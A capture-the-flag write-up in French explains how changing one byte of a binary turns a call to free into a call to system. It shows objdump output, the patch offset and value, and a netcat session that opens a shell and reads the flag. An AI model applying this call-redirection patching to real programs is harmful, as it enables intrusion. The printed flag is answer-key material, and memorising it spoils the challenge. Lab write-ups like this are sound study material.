# WriteUp Kaname

Le but de ce chall est d'obtenir un shell en ne modifiant qu'un bit du programme.

Comme la solution joue sur des offsets, les scripts de solution peuvent changé pour chaque compilation

Pour résoudre ce challenge, il suffit de remplacer l'appel à free par un appel à system. Deplus, il est possible que certaine compilation ne permette pas d'éxecuter cette solution. Pour ma part, j'ai :

`
$ objdump -M intel -d changebyone
...
0000000000000730 <free@plt>:
 730:	ff 25 e2 08 20 00    	jmp    QWORD PTR [rip+0x2008e2]        # 201018 <free@GLIBC_2.2.5>
 736:	68 00 00 00 00       	push   0x0
 73b:	e9 e0 ff ff ff       	jmp    720 <.plt>
...
0000000000000750 <system@plt>:
 750:	ff 25 d2 08 20 00    	jmp    QWORD PTR [rip+0x2008d2]        # 201028 <system@GLIBC_2.2.5>
 756:	68 02 00 00 00       	push   0x2
 75b:	e9 c0 ff ff ff       	jmp    720 <.plt>
...
 9f4:	48 89 c7             	mov    rdi,rax
 9f7:	e8 34 fd ff ff       	call   730 <free@plt>
 9fc:	b8 00 00 00 00       	mov    eax,0x0
...
`

On a un écart de +0x20 entre les plt de free et system. Deplus, l'octet à modifier est à l'indice 0x9f8 du fichier.

Il faut donc rentrer :

`
$ nc 127.0.0.1 5796
Hi,

Before starting to exploit my unbreackable programm, I give you an opportunity.
You can change one byte of my binary.
Do you get this opportunity [Y/n] :
offset : 0x9f8
value : 0x54
Ok, Thank's.

Enjoy your chall !!!

 > /bin/sh # exit
ls
changebyone
changebyone.py
passwd
cat passwd
THC??{can_you_change_me}
`
